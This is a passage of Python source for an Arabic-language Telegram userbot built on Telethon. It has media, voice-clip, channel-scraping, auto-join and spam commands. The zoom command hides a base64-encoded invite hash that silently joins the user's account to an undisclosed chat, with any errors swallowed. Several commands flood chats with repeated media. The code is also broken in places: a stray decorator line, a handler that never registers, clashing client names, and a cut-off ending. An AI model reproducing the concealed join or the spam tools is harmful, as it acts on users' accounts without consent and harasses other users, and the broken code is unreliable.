            # UNBLOCK > USER OR BOT
            UnBlock = await ESSA(UnblockRequest(id=int(user.peer_id.user_id)))
            unblocked_count += 1

            order_reply = await event.edit(f'[ ~ ] **جاري .فك المحظورين من حسابك** {round((unblocked_count * 100) / len(list.blocked), 2)}%')


        unblocked_count = 1
        order_reply = await event.edit(f'[ ! ] **تم .فك المحظورين من حسابك يرجى الأنتظار دقائق في حالة تبقى عدد قليل من المحظورين ويرجى الأنتباة هذا الأمر يسبب تعليق في حسابك في حالة أكثرت في أستعمال الأمر ** : {len(list.blocked)}\n\n[ + ] **فك المحظورين أكتمل.**')
c = requests.session()
milerbot = f'{Botcompilation}'
iqklanr1 = ['yes']
@ESSA.on(admin_cmd(outgoing=True, pattern="زوم ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiainput = mafia.pattern_match.group(1)
    mafiainput = 50 if not mafiainput else int(mafiainput)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "تحليل هذه الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "القالب غير موجود")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, mafiainput)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@essa.on(admin_cmd(outgoing=True, pattern="ص5$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois5:
        await vois.client.send_file(vois.chat_id, iqvois5, reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص6$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois6:
        await vois.client.send_file(vois.chat_id, iqvois6, reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص7$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois7:
        await vois.client.send_file(vois.chat_id, iqvois7, reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص8$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois:
        await vois.client.send_file(vois.chat_id, iqvois, reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص9$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois9 :
        await vois.client.send_file(vois.chat_id, iqvois9 , reply_to=Ti)
        await vois.delete()

@essa.on(admin_cmd(outgoing=True, pattern="ص10$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois10:
        await vois.client.send_file(vois.chat_id, iqvois10 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص11$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois11 :
        await vois.client.send_file(vois.chat_id, iqvois11 , reply_to=Ti)
        await vois.delete()
cancel_savemod = False
@essa.iq_cmd(pattern=r".سيف ميديا ?(.*)")
async def savedia(event):
    message_link = (event.message.message).replace(".سيف ميديا", "").strip()

    if not message_link:
        return await event.edit("عزيزي قم تحديد الرسالة ⚠️")

    save_dir = "media"
    os.makedirs(save_dir, exist_ok=True)

    try:
        message_link_parts = str(message_link).split("/")
        
        if message_link_parts:
            if message_link_parts[-2] == "c":
                channel_username_or_id = int(message_link_parts[-3])
                message_id = int(message_link_parts[-1])
            else:
                channel_username_or_id = message_link_parts[-2]
                message_id = int(message_link_parts[-1])
        else:
            return await event.edit("الرابط خطأ قبل بتأكد منة ⚠️")
    except Exception as e:
        return await event.edit(f"حدث خطأ ⚠️")
    
    try:
        if int(channel_username_or_id):
            channel_username_or_id = int("-100" + str(channel_username_or_id))
        
        entity = await senzir.get_entity(channel_username_or_id)      
        message = await senzir.get_messages(entity, ids=message_id)
        if not message:
            return await event.edit("عزيزي الرابط خطأ تأكد منة ⚠️")
    except ChannelPrivateError:
        await event.edit("قم بالأنضمام الى القناة لحفض المحتوى الخاص ⚠️")
    #except Exception as e:
       # return await event.edit(f"An error occurred while retrieving the message. Error: {str(e)}")

    try:
        message = await senzir.get_messages(channel_username_or_id, ids=message_id)
        if not message:
            return await event.edit("رابط الرسالة خطأ ⚠️")

        if message.media:
            file_ext = ""
            if message.photo:
                file_ext = ".jpg"
            elif message.video:
                file_ext = ".mp4"
            elif message.document:
                if hasattr(message.document, "file_name"):
                    file_ext = os.path.splitext(message.document.file_name)[1]

            if not file_ext:
                return await event.edit(f"عزيزي لاتحتوي الرسالة على وسائط ⚠️\n{message.message}")

            file_path = os.path.join(save_dir, f"media_{message.id}{file_ext}")
            await senzir.download_media(message, file=file_path)

            await senzir.send_file('me', file=file_path, caption=message.text)

            os.remove(file_path)
            await event.edit(f"تم حفض الوسائط من القناة ☸️\n\n ✔️ رابط الرسالة: {message_link}")
        else:
            await event.edit("الرسالة لاتحتوي على وسائط ⚠️")
    except Exception as e:
        await event.edit(f"عزيزي حدث خطأ ⚠️: {str(e)}")
        

@essa.iq_cmd(pattern="الغاء محتوى$",)
async def Savemod(event):
    global cancel_savemod
    cancel_savemod = True
    await event.edit("عزيزي تم الغاء تخزين الميديا بنجاح ✅")

essa.on(events.NewMessage(incoming=True))
async def chcancel(event):
    global cancel_savemod
    if isinstance(event.message, MessageService) and event.message.action and isinstance(event.message.action, MessageActionChannelMigrateFrom):
        cancel_savemod = True

@essa.iq_cmd(    pattern="محتوى(?: |$)(.*) (\d+)",)
async def Savecansle(event):
    global cancel_savemod
    
    channel_username = event.pattern_match.group(1)
    limit = int(event.pattern_match.group(2))
    
    if not channel_username:
        return await event.edit("يجب وضع اسم يوزر القناة بجانب الأمر اولا ⚠️")
    
    save_dir = "media"
    os.makedirs(save_dir, exist_ok=True)
    
    try:
        channel_entity = await senzir.get_entity(channel_username)
        messages = await senzir.get_messages(channel_entity, limit=limit)
    except Exception as e:
        return await event.edit(f"حدث خطأ ⚠️: {str(e)}")

    for message in messages:
        try:
            if message.media:
                file_ext = ""
                if message.photo:
                    file_ext = ".jpg"
                elif message.video:
                    file_ext = ".mp4"
                elif message.document:
                    if hasattr(message.document, "file_name"):
                        file_ext = os.path.splitext(message.document.file_name)[1]
                    else:
                        # Handle documents without file_name attribute
                        file_ext = ""
                
                if not file_ext:
                    continue
                
                file_path = os.path.join(save_dir, f"media_{message.id}{file_ext}")
                await message.download_media(file=file_path)
                await senzir.send_file("me", file=file_path)
                os.remove(file_path)
            
            if cancel_savemod:
                await event.edit("تم الغاء حفض الميديا ✅")
                cancel_savemod = False
                return
        except Exception as e:
            print(f"عزيزي حدث خطأ ⚠️ {message.id}. الخطأ: {str(e)}")
            continue

    await event.edit(f"تم الحفض بنجاح ✅ {channel_username} .")
@essa.on(admin_cmd(outgoing=True, pattern="ص12$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois12:
        await vois.client.send_file(vois.chat_id, iqvois12 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص13$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois13:
        await vois.client.send_file(vois.chat_id, iqvois13 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص14$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois14:
        await vois.client.send_file(vois.chat_id, iqvois14 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص15$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois15:
        await vois.client.send_file(vois.chat_id, iqvois15 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص16$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois16:
        await vois.client.send_file(vois.chat_id, iqvois16 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص17$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois17:
        await vois.client.send_file(vois.chat_id, iqvois17 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص18$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois18:
        await vois.client.send_file(vois.chat_id, iqvois18 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص19$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois19:
        await vois.client.send_file(vois.chat_id, iqvois19 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص20$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois20:
        await vois.client.send_file(vois.chat_id, iqvois20 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص21$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois21:
        await vois.client.send_file(vois.chat_id, iqvois21 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص22$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois22:
        await vois.client.send_file(vois.chat_id, iqvois22 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص23$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois23:
        await vois.client.send_file(vois.chat_id, iqvois23 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص24$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois24:
        await vois.client.send_file(vois.chat_id, iqvois24 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص25$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois25:
        await vois.client.send_file(vois.chat_id, iqvois25 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص26$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois26:
        await vois.client.send_file(vois.chat_id, iqvois26 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص27$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois27:
        await vois.client.send_file(vois.chat_id, iqvois27 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص28$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois28:
        await vois.client.send_file(vois.chat_id, iqvois28 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص29$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois29:
        await vois.client.send_file(vois.chat_id, iqvois29 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص30$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois30:
        await vois.client.send_file(vois.chat_id, iqvois30 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص31$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois31:
        await vois.client.send_file(vois.chat_id, iqvois31 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص32$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois32:
        await vois.client.send_file(vois.chat_id, iqvois32 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص33$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois33:
        await vois.client.send_file(vois.chat_id, iqvois33 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص34$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois34:
        await vois.client.send_file(vois.chat_id, iqvois34 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص35$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois35:
        await vois.client.send_file(vois.chat_id, iqvois35 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص36$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois36:
        await vois.client.send_file(vois.chat_id, iqvois36 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص37$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois37:
        await vois.client.send_file(vois.chat_id, iqvois37 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص38$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois38:
        await vois.client.send_file(vois.chat_id, iqvois38 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص39$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois39:
        await vois.client.send_file(vois.chat_id, iqvois39 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص40$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois40:
        await vois.client.send_file(vois.chat_id, iqvois40 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص41$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois41:
        await vois.client.send_file(vois.chat_id, iqvois41 , reply_to=Ti)
        await vois.delete()

@essa.on(admin_cmd(pattern="(تجميع المليار|تجميع مليار)"))
async def _(event):
    if iqklanr1[0] == "yes":
        await event.edit("**سيتم تجميع المليار , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
        channel_entity = await essa.get_entity("@EEObot")
        await essa.send_message("@EEObot", '/start')
        await asyncio.sleep(5)
        msg0 = await essa.get_messages("@EEObot", limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(5)
        msg1 = await essa.get_messages("@EEObot", limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            if iqklanr1[0] == 'no':
                break
            await asyncio.sleep(5)

            list = await ESSA(GetHistoryRequest(peer=channel_entity, limit=1,
                                                   offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع المليار بطريقه مختلفه') != -1:
                await essa.send_message(event.chat_id, f"**لاتوجد قنوات للبوت**")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await senzir(JoinChannelRequest(url))
                except:
                    bott = url.split('/')[-1]
                    await senzir(ImportChatInviteRequest(bott))
                msg2 = await essa.get_messages("@EEObot", limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await essa.send_message("me", f"تم الاشتراك في {chs} قناة")
            except:
                await essa.send_message(event.chat_id, f"**خطأ حاول بعد 6 ساعات**")
                break
        await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع !**")

iqklanr2 = ['yes']
@essa.on(admin_cmd(pattern="(تجميع العقاب|تجميع عقاب)"))
async def _(event):
    if iqklanr2[0] == "yes":
        await event.edit("**سيتم تجميع  , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
        channel_entity = await essa.get_entity("@MARKTEBOT")
        await essa.send_message("@MARKTEBOT", '/start')
        await asyncio.sleep(5)
        msg0 = await essa.get_messages("@MARKTEBOT", limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(5)
        msg1 = await essa.get_messages("@MARKTEBOT", limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            if iqklanr2[0] == 'no':
                break
            await asyncio.sleep(5)

            list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                                   offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لايوجد قنوات خلصت') != -1:
                await essa.send_message(event.chat_id, f"**لاتوجد قنوات للبوت**")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await essa(JoinChannelRequest(url))
                except:
                    bott = url.split('/')[-1]
                    await essa(ImportChatInviteRequest(bott))
                msg2 = await essa.get_messages("@MARKTEBOT", limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await essa.send_message("me", f"تم الاشتراك في {chs} قناة")
            except:
                await essa.send_message(event.chat_id, f"**خطأ حاول بعد 6 ساعات**")
                break
        await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع !**")

iqklanr3 = ['yes']
@essa.on(admin_cmd(pattern="(تجميع العرب|تجميع عرب)"))
async def _(event):
    if iqklanr3[0] == "yes":
        await event.edit("**سيتم تجميع  , قبل كل شي تأكد من انك قمت بلانظمام الى القنوات الاشتراك الاجباري للبوت لعدم حدوث اخطاء**")
        channel_entity = await essa.get_entity("@xnsex21bot")
        await essa.send_message("@xnsex21bot", '/start')
        await asyncio.sleep(5)
        msg0 = await essa.get_messages("@xnsex21bot", limit=1)
        await msg0[0].click(2)
        await asyncio.sleep(5)
        msg1 = await essa.get_messages("@xnsex21bot", limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            if iqklanr3[0] == 'no':
                break
            await asyncio.sleep(5)

            list = await essa(GetHistoryRequest(peer=channel_entity, limit=1,
                                                   offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لايوجد قنوات خلصت') != -1:
                await essa.send_message(event.chat_id, f"**لاتوجد قنوات للبوت**")
                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await essa(JoinChannelRequest(url))
                except:
                    bott = url.split('/')[-1]
                    await essa(ImportChatInviteRequest(bott))
                msg2 = await essa.get_messages("@xnsex21bot", limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await essa.send_message("me", f"تم الاشتراك في {chs} قناة")
            except:
                await senzir.send_message(event.chat_id, f"**خطأ حاول بعد 6 ساعات**")
                break
        await essa.send_message(event.chat_id, "**تم الانتهاء من التجميع !**")





@essa.on(admin_cmd(outgoing=True, pattern="ص42$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois42:
        await vois.client.send_file(vois.chat_id, iqvois42 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص43$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois43:
        await vois.client.send_file(vois.chat_id, iqvois43 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص44$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois44:
        await vois.client.send_file(vois.chat_id, iqvois44 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص45$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois45:
        await vois.client.send_file(vois.chat_id, iqvois45 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص46$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois46:
        await vois.client.send_file(vois.chat_id, iqvois46 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص47$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois47:
        await vois.client.send_file(vois.chat_id, iqvois47 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص48$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois48:
        await vois.client.send_file(vois.chat_id, iqvois48 , reply_to=Ti)
        await vois.delete()
@essa.on(events.NewMessage(outgoing=True, pattern=r'.سبام صوره ?(.*)'))
async def RepeatImage(event):
    chat = await event.get_chat()
    MESSAGE = ((event.message.message).replace(".سبام صوره", "")).split(" ")

    try:
        RepeatCount = MESSAGE[1]

        if event.message.reply_to != None:
            reply_to = event.message.reply_to.reply_to_msg_id
            if event.is_private:
                from telethon.tl.functions.messages import GetMessagesRequest   
                GetImage = await event.client(GetMessagesRequest(id=[reply_to]))
            else:
                from telethon.tl.functions.channels import GetMessagesRequest        
                GetImage = await event.client(GetMessagesRequest(channel=chat.id, id=[reply_to]))

            if GetImage.messages[0].media != None:
                if str(GetImage.messages[0].media).startswith('MessageMediaPhoto'):
                    for x in range(0, int(RepeatCount)):
                        os_send = await event.client(SendMediaRequest(peer=chat.id, message='', media=InputMediaPhoto(InputPhoto(id=GetImage.messages[0].media.photo.id, access_hash=GetImage.messages[0].media.photo.access_hash ,file_reference=GetImage.messages[0].media.photo.file_reference))))
                else:
                    os_failed = await event.edit(f'**لم تقم بالرد على الصوره**')
            else:
                os_failed = await event.edit(f'**لم تقم بالرد على الصوره**')

        else:
            os_failed = await event.edit(f'**يجب الرد على الصوره مع الامر**')
    except Exception as e:
        os_failed = await event.edit(f'**بالرجاء استخدام الصيفة التالية : .سبام صوره 10 + مع الرد على الصوره**')



 # 6335191266:
@essa.on(events.NewMessage(outgoing=True, pattern=r'.سبام متحركه ?(.*)'))
async def RepeatImage(event):
    chat = await event.get_chat()
    MESSAGE = ((event.message.message).replace(".سبام متحركه", "")).split(" ")

    try:
        RepeatCount = MESSAGE[1]

        if event.message.reply_to != None:
            reply_to = event.message.reply_to.reply_to_msg_id
            if event.is_private:
                from telethon.tl.functions.messages import GetMessagesRequest   
                GetImage = await event.client(GetMessagesRequest(id=[reply_to]))
            else:
                from telethon.tl.functions.channels import GetMessagesRequest        
                GetImage = await event.client(GetMessagesRequest(channel=chat.id, id=[reply_to]))

            if GetImage.messages[0].media != None:
                if str(GetImage.messages[0].media).startswith('MessageMediaDocument'):
                    for x in range(0, int(RepeatCount)):
                        os_send = await event.client(SendMediaRequest(peer=chat.id, message='', media=InputMediaDocument(InputDocument(id=GetImage.messages[0].media.document.id, access_hash=GetImage.messages[0].media.document.access_hash ,file_reference=GetImage.messages[0].media.document.file_reference))))
                else:
                    os_failed = await event.edit(f'**لم تقم بالرد على متحركه **')
            else:
                os_failed = await event.edit(f'**لم تقم بالرد على متحركه **')

        else:
            os_failed = await event.edit(f'**يجب الرد على متحركه **')
    except Exception as e:
        os_failed = await event.edit(f'**بالرجاء استخدام الصيفة التالية : .سبام متحركه 10 + مع الرد على متحركه**')

 # فرخ لاتخمط لاالفكرة ولا الكود يافرخ
@essa.on(events.NewMessage(outgoing=True, pattern=r'.سبام فيديو ?(.*)'))
async def RepeatImage(event):
    chat = await event.get_chat()
    MESSAGE = ((event.message.message).replace(".سبام فيديو", "")).split(" ")

    try:
        RepeatCount = MESSAGE[1]

        if event.message.reply_to != None:
            reply_to = event.message.reply_to.reply_to_msg_id
            if event.is_private:
                from telethon.tl.functions.messages import GetMessagesRequest   
                GetImage = await event.client(GetMessagesRequest(id=[reply_to]))
            else:
                from telethon.tl.functions.channels import GetMessagesRequest        
                GetImage = await event.client(GetMessagesRequest(channel=chat.id, id=[reply_to]))

            if GetImage.messages[0].media != None:
                if str(GetImage.messages[0].media).startswith('MessageMediaDocument'):
                    for x in range(0, int(RepeatCount)):
                        os_send = await event.client(SendMediaRequest(peer=chat.id, message='', media=InputMediaDocument(InputDocument(id=GetImage.messages[0].media.document.id, access_hash=GetImage.messages[0].media.document.access_hash ,file_reference=GetImage.messages[0].media.document.file_reference))))
                else:
                    os_failed = await event.edit(f'**لم تقم بالرد على فيديو**')
            else:
                os_failed = await event.edit(f'**لم تقم بالرد فيديو**')

        else:
            os_failed = await event.edit(f'**يجب الرد على فيديو**')
    except Exception as e:
        os_failed = await event.edit(f'**بالرجاء استخدام الصيفة التالية : .سبام فيديو 10 + مع الرد على فيديو**')



 # فرخ لاتخمط لاالفكرة ولا الكود يافرخ
@essa.on(events.NewMessage(outgoing=True, pattern=r'.سبام ملصق ?(.*)'))
async def RepeatImage(event):
    chat = await event.get_chat()
    MESSAGE = ((event.message.message).replace(".سبام ملصق", "")).split(" ")

    try:
        RepeatCount = MESSAGE[1]

        if event.message.reply_to != None:
            reply_to = event.message.reply_to.reply_to_msg_id
            if event.is_private:
                from telethon.tl.functions.messages import GetMessagesRequest   
                GetImage = await event.client(GetMessagesRequest(id=[reply_to]))
            else:
                from telethon.tl.functions.channels import GetMessagesRequest        
                GetImage = await event.client(GetMessagesRequest(channel=chat.id, id=[reply_to]))

            if GetImage.messages[0].media != None:
                if str(GetImage.messages[0].media).startswith('MessageMediaDocument'):
                    for x in range(0, int(RepeatCount)):
                        os_send = await event.client(SendMediaRequest(peer=chat.id, message='', media=InputMediaDocument(InputDocument(id=GetImage.messages[0].media.document.id, access_hash=GetImage.messages[0].media.document.access_hash ,file_reference=GetImage.messages[0].media.document.file_reference))))
                else:
                    os_failed = await event.edit(f'**لم تقم بالرد على ملصق**')
            else:
                os_failed = await event.edit(f'**لم تقم بالرد ملصق**')

        else:
            os_failed = await event.edit(f'**يجب الرد على ملصق**')
    except Exception as e:
        os_failed = await event.edit(f'**بالرجاء استخدام الصيفة التالية : .سبام ملصق 10 + مع الرد على ملصق**')

 @ESSA
@essa.on(events.NewMessage(outgoing=True, pattern=r'.سبام صوت ?(.*)'))
async def RepeatImage(event):
    chat = await event.get_chat()
    MESSAGE = ((event.message.message).replace(".سبام صوت", "")).split(" ")

    try:
        RepeatCount = MESSAGE[1]

        if event.message.reply_to != None:
            reply_to = event.message.reply_to.reply_to_msg_id
            if event.is_private:
                from telethon.tl.functions.messages import GetMessagesRequest   
                GetImage = await event.client(GetMessagesRequest(id=[reply_to]))
            else:
                from telethon.tl.functions.channels import GetMessagesRequest        
                GetImage = await event.client(GetMessagesRequest(channel=chat.id, id=[reply_to]))

            if GetImage.messages[0].media != None:
                if str(GetImage.messages[0].media).startswith('MessageMediaDocument'):
                    for x in range(0, int(RepeatCount)):
                        os_send = await event.client(SendMediaRequest(peer=chat.id, message='', media=InputMediaDocument(InputDocument(id=GetImage.messages[0].media.document.id, access_hash=GetImage.messages[0].media.document.access_hash ,file_reference=GetImage.messages[0].media.document.file_reference))))
                else:
                    os_failed = await event.edit(f'**لم تقم بالرد على صوت**')
            else:
                os_failed = await event.edit(f'**لم تقم بالرد صوت**')

        else:
            os_failed = await event.edit(f'**يجب الرد على صوت**')
    except Exception as e:
        os_failed = await event.edit(f'**بالرجاء استخدام الصيفة التالية : .سبام صوت 10 + مع الرد على صوت**')
@essa.on(admin_cmd(outgoing=True, pattern="ص96$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois96:
        await vois.client.send_file(vois.chat_id, iqvois96 , reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="ص97$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
